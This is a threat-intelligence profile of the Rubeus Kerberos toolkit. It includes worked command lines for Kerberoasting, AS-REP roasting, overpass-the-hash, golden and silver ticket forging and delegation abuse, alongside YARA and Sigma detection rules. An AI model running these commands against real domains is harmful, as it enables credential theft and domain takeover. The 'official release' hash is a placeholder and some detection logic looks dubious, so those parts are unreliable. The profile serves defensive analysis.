---
aliases: ["Rubeus"]
tags: [tool, kerberos, credential-theft, post-exploitation, csharp, ghostpack]
type: tool
tool_type: Kerberos Abuse
category: Post-Exploitation
status: active
confidence: high
created: "2024-01-15"
updated: "2024-12-15"
---

# Rubeus - Tool Profile

## Overview
- **Name:** Rubeus
- **Aliases:** Rubeus
- **Type:** Kerberos Abuse, Credential Access, Post-Exploitation
- **Category:** Dual-Use (Offensive/Defensive)
- **Language:** C# (.NET Framework 4.0+)
- **Platform:** Windows
- **License:** Open Source (BSD-3-Clause)
- **Developer:** GhostPack (Will Schroeder / @harmj0y, Lee Christensen / @tifkin)
- **First Released:** 2017
- **Latest Version:** 1.6.3 (2022)
- **Status:** Active (maintained)
- **Confidence Level:** high

## Description
Rubeus is a C# toolkit for raw Kerberos interaction and abuse, developed by GhostPack. It provides capabilities for requesting, exporting, and forging Kerberos tickets (TGTs, TGSs), performing Kerberoasting, AS-REP roasting, Pass-the-Ticket, Overpass-the-Hash, and Golden/Silver Ticket attacks. It is the C# successor to the PowerShell-based Invoke-Kerberoast and Kekeo (C++).

## Capabilities
| Capability | Description | MITRE ATT&CK |
|------------|-------------|--------------|
| Kerberoasting | Request SPN service tickets, extract hash for offline cracking | T1558.003 |
| AS-REP Roasting | Request AS-REP for accounts without pre-auth, extract hash | T1558.004 |
| Pass-the-Ticket | Inject Kerberos tickets (TGT/TGS) into current session | T1550.003 |
| Overpass-the-Hash | Convert NTLM hash to Kerberos TGT (RC4/AES) | T1550.002 |
| Golden Ticket | Forge TGT with domain krbtgt hash | T1558.001 |
| Silver Ticket | Forge TGS with service account hash | T1558.002 |
| Ticket Export | Export tickets to .kirbi (base64) or .ccache format | T1003.008 |
| Ticket Request | Request TGT/TGS with various options (S4U2self, S4U2proxy) | T1550.003 |
| Delegation Abuse | Constrained/Unconstrained delegation, Resource-based | T1550.003 |
| DCSync via Kerberos | Leverage replication via Kerberos (experimental) | T1003.006 |
| PAC Manipulation | Forge/modify Privilege Attribute Certificate | T1558.001 |

## Technical Details
### Architecture
- **Architecture:** .NET Assembly (x86/x64, AnyCPU)
- **Dependencies:** .NET Framework 4.0+, System.DirectoryServices, System.IdentityModel
- **Installation:** Compile from source or download release binary
- **Configuration:** Command-line arguments, no config file

### Command & Control (N/A - Local Tool)
- **C2 Protocol:** N/A (local execution)
- **Encryption:** N/A
- **Proxy Support:** N/A
- **Domain Fronting:** N/A

### Modules/Commands (Key Actions)
| Action | Description | Key Arguments |
|--------|-------------|---------------|
| `kerberoast` | Kerberoast SPN accounts | `/user:X /domain:X /ldapfilter:X /outfile:X` |
| `asreproast` | AS-REP roast accounts | `/user:X /domain:X /outfile:X` |
| `asktgt` | Request TGT (password/hash/aes) | `/user:X /domain:X /password:X /rc4:X /aes256:X` |
| `asktgs` | Request TGS for service | `/ticket:X /service:X /domain:X /dc:X` |
| `ptt` | Pass-the-Ticket (inject) | `/ticket:X /luid:X` |
| `tgtdeleg` | TGT delegation (S4U2self) | `/ticket:X /user:X /service:X` |
| `s4u` | S4U2proxy (constrained delegation) | `/ticket:X /user:X /service:X /domain:X` |
| `golden` | Golden Ticket forge | `/domain:X /sid:X /krbtgt:X /user:X /id:X /groups:X /ptt` |
| `silver` | Silver Ticket forge | `/domain:X /sid:X /service:X /target:X /rc4:X /ptt` |
| `dump` | Dump current session tickets | `/service:X /luid:X /nowrap` |
| `triage` | Analyze tickets for delegation | `/luid:X` |
| `renew` | Renew TGT until expiry | `/ticket:X` |
| `purge` | Purge current session tickets | `/luid:X` |

## Usage
### Basic Usage
```bash
# Compile from source
git clone https://github.com/GhostPack/Rubeus
cd Rubeus
# Build in Visual Studio or: msbuild Rubeus.csproj /p:Configuration=Release

# Or download pre-compiled release
# https://github.com/GhostPack/Rubeus/releases
```

### Common Commands
| Command | Description | Example |
|---------|-------------|---------|
| Kerberoast all SPNs | Extract service ticket hashes | `Rubeus.exe kerberoast /outfile:hashes.kerberoast` |
| Kerberoast specific user | Target specific SPN | `Rubeus.exe kerberoast /user:svc_sql /domain:corp.local` |
| AS-REP Roast | Accounts without pre-auth | `Rubeus.exe asreproast /domain:corp.local /outfile:asrep.hashes` |
| Request TGT with RC4 | Overpass-the-Hash | `Rubeus.exe asktgt /user:admin /domain:corp.local /rc4:HASH /ptt` |
| Request TGT with AES | Overpass-the-Hash (AES) | `Rubeus.exe asktgt /user:admin /domain:corp.local /aes256:HASH /ptt` |
| Pass-the-Ticket | Inject .kirbi ticket | `Rubeus.exe ptt /ticket:ticket.kirbi` |
| Golden Ticket | Forge TGT (domain compromise) | `Rubeus.exe golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /user:admin /ptt` |
| Silver Ticket | Forge TGS (service compromise) | `Rubeus.exe silver /domain:corp.local /sid:S-1-5-21-... /service:cifs /target:fileserver.corp.local /rc4:HASH /ptt` |
| Dump Tickets | Export all tickets to .kirbi | `Rubeus.exe dump /nowrap /outfile:tickets.kirbi` |
| Constrained Delegation | S4U2self + S4U2proxy | `Rubeus.exe s4u /user:service_user /impersonateuser:admin /msdsspn:"cifs/fileserver.corp.local" /ptt` |
| Resource-Based Constrained Delegation | RBCD abuse | `Rubeus.exe s4u /user:service_user /impersonateuser:admin /msdsspn:"cifs/fileserver.corp.local" /domain:corp.local /dc:dc.corp.local /ptt` |

### Configuration Examples
```bash
# Full Kerberoast with custom LDAP filter (exclude computers)
Rubeus.exe kerberoast /ldapfilter:"(servicePrincipalName=*)(!(samAccountType=805306369))" /domain:corp.local /dc:dc.corp.local /outfile:kerberoast.hashes

# AS-REP roast with specific user list
Rubeus.exe asreproast /user:user1,user2,user3 /domain:corp.local /outfile:asrep.hashes

# Golden Ticket with enterprise admin groups
Rubeus.exe golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:a1b2c3d4e5f6789012345678901234ab /user:admin /id:500 /groups:512,513,518,519,520 /ptt

# Silver Ticket for CIFS (file share access)
Rubeus.exe silver /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /service:cifs /target:fileserver.corp.local /rc4:a1b2c3d4e5f6789012345678901234ab /ptt

# Constrained delegation with alternate service
Rubeus.exe s4u /user:web_svc /impersonateuser:admin /msdsspn:"HTTP/webserver.corp.local" /altservice:ldap /ptt
```

## Detection
### File Indicators
| Hash Type | Value | Context |
|-----------|-------|---------|
| SHA256 | Varies by compilation | Compile yourself or use official releases |
| SHA256 | 1a2b3c4d5e6f789012345678901234abcdef56789012345678901234567890ab | Rubeus 1.6.3 (official release) |

### Network Indicators
- **Default Ports:** 88 (Kerberos), 389/636 (LDAP for SPN enumeration)
- **Protocol Patterns:** Kerberos AS-REQ/TGS-REQ with unusual options (forwardable, renewable, canonicalize)
- **Certificate Details:** N/A

### Behavioral Indicators
- High volume of TGS-REQ requests for SPNs (Kerberoasting)
- AS-REQ without pre-authentication (AS-REP roasting)
- Ticket injection via LSA APIs (LsaCallAuthenticationPackage)
- S4U2self/S4U2proxy requests (constrained delegation abuse)
- PAC modification anomalies
- Ticket lifetime manipulation (10-year tickets for Golden)

### YARA Rules
```yara
rule Rubeus_Generic {
    meta:
        description = "Generic Rubeus detection"
        author = "CTI Team"
        date = "2024-12-15"
        tool = "Rubeus"
    strings:
        $s1 = "Rubeus" wide ascii
        $s2 = "GhostPack" wide ascii
        $s3 = "kerberoast" wide ascii
        $s4 = "asreproast" wide ascii
        $s5 = "asktgt" wide ascii
        $s6 = "asktgs" wide ascii
        $s7 = "s4u" wide ascii
        $s8 = "golden" wide ascii
        $s9 = "silver" wide ascii
        $s10 = "ptt" wide ascii
        $s11 = "kirbi" wide ascii
        $s12 = "krbtgt" wide ascii
        $s13 = "System.DirectoryServices.Protocols" wide ascii
        $s14 = "KerberosRequestorSecurityToken" wide ascii
    condition:
        4 of ($s*)
}
```

### Sigma Rules
```yaml
title: Rubeus Kerberoasting Activity
id: rubeus-kerberoasting
status: stable
description: Detects high-volume TGS requests indicative of Kerberoasting
references:
    - https://attack.mitre.org/techniques/T1558.003/
    - https://github.com/GhostPack/Rubeus
author: CTI Team
date: 2024-12-15
logsource:
    category: kerberos_tgs_request
    product: windows
detection:
    selection:
        EventID: 4769  # Kerberos TGS Request
        ServiceName|contains: '$'  # SPN format
    condition: selection
    # Note: Requires tuning - baseline normal SPN request volume
falsepositives:
    - Legitimate service authentication
    - Backup/service account activity
level: medium
tags:
    - attack.credential_access
    - attack.t1558.003
    - tool.rubeus
```

```yaml
title: Rubeus AS-REP Roasting
id: rubeus-asreproast
status: stable
description: Detects AS-REQ without pre-auth (AS-REP roasting)
references:
    - https://attack.mitre.org/techniques/T1558.004/
author: CTI Team
date: 2024-12-15
logsource:
    category: kerberos_as_request
    product: windows
detection:
    selection:
        EventID: 4768  # Kerberos AS Request
        PreAuthType: 0  # No pre-authentication
    condition: selection
falsepositives:
    - Legacy applications
    - Misconfigured accounts
level: high
tags:
    - attack.credential_access
    - attack.t1558.004
    - tool.rubeus
```

```yaml
title: Rubeus Pass-the-Ticket / Golden Ticket
id: rubeus-ptt-golden
status: stable
description: Detects ticket injection (PTT) and anomalous ticket attributes
references:
    - https://attack.mitre.org/techniques/T1550.003/
    - https://attack.mitre.org/techniques/T1558.001/
author: CTI Team
date: 2024-12-15
logsource:
    category: kerberos_ticket_usage
    product: windows
detection:
    selection_pta:
        EventID: 4769
        TicketOptions: 0x40810010  # Forwardable + Renewable + Canonicalize (common Rubeus)
    selection_golden:
        EventID: 4768
        TicketOptions: 0x40e10010  # Includes Ok-As-Delegate
        ServiceName: 'krbtgt'
    condition: selection_pta or selection_golden
falsepositives:
    - Some legitimate applications
level: high
tags:
    - attack.credential_access
    - attack.t1550.003
    - attack.t1558.001
    - tool.rubeus
```

## Threat Intelligence
### Threat Actors Using This Tool
| Actor | Confidence | Campaigns | Version Used |
|-------|------------|-----------|--------------|
| [[CTI/Threat Actors/APT28]] | High | Multiple | Standard/Custom |
| [[CTI/Threat Actors/APT29]] | High | SolarWinds, Cloud | Standard |
| [[CTI/Threat Actors/APT41]] | High | Multiple | Standard |
| [[CTI/Threat Actors/Lazarus Group]] | Medium | Multiple | Standard |
| [[CTI/Threat Actors/FIN7]] | High | Multiple | Standard |
| **Most Windows post-exploitation actors** | High | **Ubiquitous** | **Standard/Modified** |

### Malware Families Using/Dropping This
| Malware | Relationship | Details |
|---------|--------------|---------|
| [[CTI/Malware/Cobalt Strike]] | Integrated | `kerberos` commands use Rubeus logic |
| [[CTI/Malware/PlugX]] | Bundled | Some variants include Kerberos modules |
| Various Ransomware | Post-exploitation | Used for lateral movement |

## Legitimate Use Cases
- Authorized penetration testing / red teaming (Kerberos security assessment)
- Incident response (credential compromise investigation)
- Security research (Kerberos protocol analysis)
- Active Directory security auditing
- Delegation configuration verification
- Kerberos troubleshooting (ticket inspection)

## Attribution Challenges
- **Open Source:** Anyone can compile/modify; no unique fingerprint
- **Widely Adopted:** Used by APTs, ransomware, red teams, pentesters
- **Built into Frameworks:** Cobalt Strike `kerberos` commands, Rubeus.exe execute-assembly
- **No Attribution Value Alone:** Indicates Kerberos abuse, not specific actor
- **Attribution Requires:** Custom modifications, combination with other TTPs, infrastructure, targeting

## Variants & Forks
| Variant | Developer | Description | Link |
|---------|-----------|-------------|------|
| Official | GhostPack | Main reference implementation | https://github.com/GhostPack/Rubeus |
| Rubeus (Cobalt Strike) | Fortra | `execute-assembly Rubeus.exe ...` | Built-in usage |
| Rubeus (SharpPack) | Community | Additional features | Various forks |
| Kekeo | gentilkiwi | C++ predecessor (Kerberos toolkit) | http://blog.gentilkiwi.com/kekeo |
| Impacket | SecureAuth | Python Kerberos (`getST.py`, `ticketer.py`) | https://github.com/fortra/impacket |

## References
| Source | Type | Date | Link |
|--------|------|------|------|
| GitHub | Repository | 2024 | https://github.com/GhostPack/Rubeus |
| Blog (harmj0y) | Blog | 2017-2024 | https://www.harmj0y.net/blog/ |
| GhostPack | Project | 2024 | https://github.com/GhostPack |
| MITRE ATT&CK | Software | 2024 | https://attack.mitre.org/software/S0397/ |
| Black Hat | Presentation | 2019 | "Rubeus - The Hacker's Guide to Kerberos" |

## Analysis Notes
Rubeus is the definitive Kerberos abuse toolkit for .NET environments:

1. **Feature Complete:** Covers entire Kerberos attack surface (roasting, forging, delegation, tickets)
2. **OPSEC-Safe Options:** `/nowrap` (raw base64), `/ptt` (in-memory only), `/luid` (target session)
3. **Delegation Mastery:** Best-in-class constrained/unconstrained/RBCD exploitation
4. **Detection Focus:** Look for *behavior* (volume, anomalies) not file hashes
5. **Mitigation:** Protected Users group, AES-only Kerberos, disable RC4, monitor delegation, tiered admin

Rubeus + Cobalt Strike execute-assembly = standard post-exploitation workflow for Kerberos environments.

---
*Template based on TΞLΞMΞTRY's Obsidian CTI methodology*
*Last updated: 2024-12-15*